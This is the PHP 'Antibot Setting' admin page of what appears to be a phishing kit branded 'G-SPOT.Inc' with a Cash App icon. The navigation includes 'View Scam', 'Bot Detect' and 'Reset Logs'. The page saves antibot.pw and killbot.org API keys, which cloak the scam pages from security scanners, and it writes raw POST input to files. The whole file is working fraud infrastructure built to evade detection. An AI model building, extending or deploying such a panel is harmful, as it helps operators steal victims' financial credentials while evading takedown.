<?php 
session_start();
include '../main.php';

if (isset($_POST['antibot'])) {
  unlink("../antibot.ini");
  $flow = fopen("../antibot.ini", "a");
  fwrite($flow, $_POST['antibotkey']."\n");
  fclose($flow);
}
if (isset($_POST['killbot'])) {
  unlink("../killbot.ini");
  $flow = fopen("../killbot.ini", "a");
  fwrite($flow, $_POST['killbotkey']."\n");
  fclose($flow);
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta content="width=device-width, initial-scale=1, maximum-scale=1, shrink-to-fit=no" name="viewport">
  <title>G-SPOT - ANTIBOT Setting</title>

  <!-- General CSS Files -->
  <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css">
  <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.2/css/all.css">

  <!-- Template CSS -->
  <link rel="stylesheet" href="css/style.css">
  <link rel="stylesheet" href="css/components.css">
  <script src="https://code.iconify.design/1/1.0.7/iconify.min.js"></script>
</head>

<body>
  <div id="app">
    <div class="main-wrapper">
    <div class="navbar-bg"></div>
      <nav class="navbar navbar-expand-lg main-navbar">
        <div class="mr-auto">
          <ul class="navbar-nav mr-3">
            <li><a href="#" data-toggle="sidebar" class="nav-link nav-link-lg"><i class="fas fa-bars"></i></a></li>
          </ul>
        </div>
        <ul class="navbar-nav navbar-right ml-auto">
          <li class="dropdown"><a href="#" data-toggle="dropdown" class="nav-link dropdown-toggle nav-link-lg nav-link-user">
            <div class="d-sm-none d-lg-inline-block">G-SPOT</div></a>
            <div class="dropdown-menu dropdown-menu-right">
            <a href="https://<?php echo $_SERVER['SERVER_NAME']; ?>/?<?= $param ?>" class="dropdown-item has-icon">
                <i class="fas fa-user"></i> Go to G-SPOT panel
              </a>
              <a href="https://<?php echo $_SERVER['SERVER_NAME']; ?>/?<?= $param ?>" class="dropdown-item has-icon">
                <i class="fas fa-user-lock"></i> View Scam
              </a>
            <!--  <a href="logout.php" class="dropdown-item has-icon">
                <i class="fas fa-sign-out-alt"></i> Logout
              </a> -->
            </div>
          </li>
        </ul>
      </nav>
      <div class="main-sidebar">
        <aside id="sidebar-wrapper">
          <div class="sidebar-brand">
            <a href="https://<?php echo $_SERVER['SERVER_NAME']; ?>/" style="color: #000000;"><i class="iconify" data-icon="simple-icons:cashapp"></i> G-SPOT.Inc</a>
          </div>
          <div class="sidebar-brand sidebar-brand-sm">
            <a href="https://<?php echo $_SERVER['SERVER_NAME']; ?>"><i class="iconify" data-icon="simple-icons:cashapp"></i></a>
          </div>
          <ul class="sidebar-menu">
              <li><a class="nav-link" href="https://<?php echo $_SERVER['SERVER_NAME']; ?>/panel"><i class="fas fa-home"></i> <span>Dashboard</span></a></li>
              <li><a class="nav-link" href="settings.php"><i class="fas fa-cogs"></i> <span>Settings</span></a></li>
              <li><a class="nav-link" href="killbot.php"><i class="fas fa-robot"></i> <span>Antibot Setting</span></a></li>
              <li><a class="nav-link" href="bot.php"><i class="fas fa-bug"></i> <span>Bot Detect</span></a></li>
              <li><a class="nav-link" href="reset.php"><i class="fas fa-trash-alt"></i> <span>Reset Logs</span></a></li>
            </ul>
        </aside>
      </div>
      <!-- Main Content -->
      <div class="main-content">
        <section class="section">
          <div class="section-header">
            <h1>Antibot Setting</h1>
          </div>
        <div class="section-body">
            <div class="row">
                <div class="col-md-12">
            <div class="card ">
              <div class="card-body ">
                <form action="" method="post" class="form-horizontal">
                <table class="table">
                  <thead class="text-danger">
                    <tr>
                      <td><strong>ANTIBOT.PW KEY</strong></td>
                      <td><strong>YOUR ANTIBOT.PW KEY</strong></td>
                    </tr>
                  </thead>
                  <tbody>
                    <tr>
                      <td><div class="col-md-8"><input type="text" name="antibotkey" class="form-control" placeholder="Paste your antibot.pw key here"></div></td>
                      <td><div class="col-md-8"><input type="text" class="form-control" readonly value="<?= file_get_contents("../antibot.ini") ?>"></div></td>
                    </tr>
                  </tbody>
                </table><br>
                <center><button type="submit" name="antibot" class="btn btn-danger"><i class="fa fa-check"></i>&nbsp;&nbsp;&nbsp;UPDATE</button></center>
                <span class="help-block">If your enter API key, Antibot.pw automatically active</span>
              </div>
            </div>
			<div class="card ">
              <div class="card-body ">
                <form action="" method="post" class="form-horizontal">
                <table class="table">
                  <thead class="text-danger">
                    <tr>
                      <td><strong>KILLBOT.ORG KEY</strong></td>
                      <td><strong>YOUR KILLBOT.ORG KEY</strong></td>
                    </tr>
                  </thead>
                  <tbody>
                    <tr>
                      <td><div class="col-md-8"><input type="text" name="killbotkey" class="form-control" placeholder="Paste your killbot.org key here"></div></td>
                      <td><div class="col-md-8"><input type="text" class="form-control" readonly value="<?= file_get_contents("../killbot.ini") ?>"></div></td>
                    </tr>
                  </tbody>
                </table><br>
                <center><button type="submit" name="killbot" class="btn btn-danger"><i class="fa fa-check"></i>&nbsp;&nbsp;&nbsp;UPDATE</button></center>
                <span class="help-block">If your enter API key, Killbot.org automatically active</span>
              </div>
            </div>
        </section>
        <script language="JavaScript1.2">
var message=" G - S P O T . I n c"
var neonbasecolor="black"
var neontextcolor="gold"
var neontextcolor2="lime"
var neontexsize="8"
var flashspeed=50 
var flashingletters=2 
var flashingletters2=15 
var flashpause=0  
///No need to edit below this line/////
var n=0
if (document.all||document.getElementById){
document.write('<b>')
document.write('<font color="'+neonbasecolor+neontexsize+'">')
for (m=0;m<message.length;m++)
document.write('<span id="neonlight'+m+'">'+message.charAt(m)+'</span>')
document.write('</font>')
document.write('</b>')
}
else
document.write(message)
function crossref(number){
var crossobj=document.all? eval("document.all.neonlight"+number) : document.getElementById("neonlight"+number)
return crossobj
}
function neon(){
//Change all letters to base color
if (n==0){
for (m=0;m<message.length;m++)
crossref(m).style.color=neonbasecolor
}
//cycle through and change individual letters to neon color
crossref(n).style.color=neontextcolor
if (n>flashingletters-1) crossref(n-flashingletters).style.color=neontextcolor2
if (n>(flashingletters+flashingletters2)-1) crossref(n-flashingletters-flashingletters2).style.color=neonbasecolor
if (n<message.length-1)
n++
else{
n=0
clearInterval(flashing)
setTimeout("beginneon()",flashpause)
return
}
}
function beginneon(){
if (document.all||document.getElementById)
flashing=setInterval("neon()",flashspeed)
}
beginneon()
</script>
      </div>
      	<footer class="main-footer">
        <div class="text-center text-dark"><p>きみ の こと が すき だから</p></div>
    </footer>
    </div>
  </div>

  <!-- General JS Scripts -->
  <script src="https://code.jquery.com/jquery-3.3.1.min.js"></script>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.7/umd/popper.min.js"></script>
  <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/js/bootstrap.min.js"></script>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.nicescroll/3.7.6/jquery.nicescroll.min.js"></script>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/moment.js/2.24.0/moment.min.js"></script>
  <script src="js/stisla.js"></script>

  <!-- Template JS File -->
  <script src="js/scripts.js"></script>
  <script src="js/custom.js"></script>

</body>
</html>